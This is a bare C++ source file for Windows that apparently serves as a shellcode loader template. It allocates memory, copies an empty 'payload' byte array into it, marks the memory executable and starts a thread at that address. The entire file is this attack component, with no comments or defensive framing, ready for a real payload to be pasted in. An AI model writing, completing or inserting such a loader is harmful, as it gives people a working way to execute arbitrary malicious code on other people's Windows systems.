#include <windows.h>
#include <stdio.h>
#include <iostream>

unsigned char payload[] = "";


unsigned int payload_len = sizeof(payload);

int main() {
    void * payload_mem;
    BOOL exec;
    HANDLE th;
    DWORD oldprotect;
    payload_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(payload_mem, payload, payload_len);

    exec = VirtualProtect(payload_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

    if (exec != 0 )
    {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) payload_mem, payload_mem, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;

}